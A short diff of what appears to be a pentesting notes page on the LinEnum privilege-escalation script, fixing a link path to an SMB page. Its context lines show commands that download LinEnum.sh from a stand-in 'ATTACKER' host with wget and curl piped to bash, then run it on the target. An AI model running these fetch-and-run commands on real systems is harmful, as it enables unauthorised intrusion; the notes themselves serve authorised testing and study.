@@ -19,7 +19,7 @@ cd /tmp && wget http://ATTACKER/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.s
 curl -sL http://ATTACKER/LinEnum.sh | bash -s -- -t
 ```
 
-Transfer channels: [netcat](../Shell/netcat.md), [smb](../Tools/smb.md).
+Transfer channels: [netcat](../Shell/netcat.md), [smb](../Protocols/smb.md).
 
 ## Run it
 
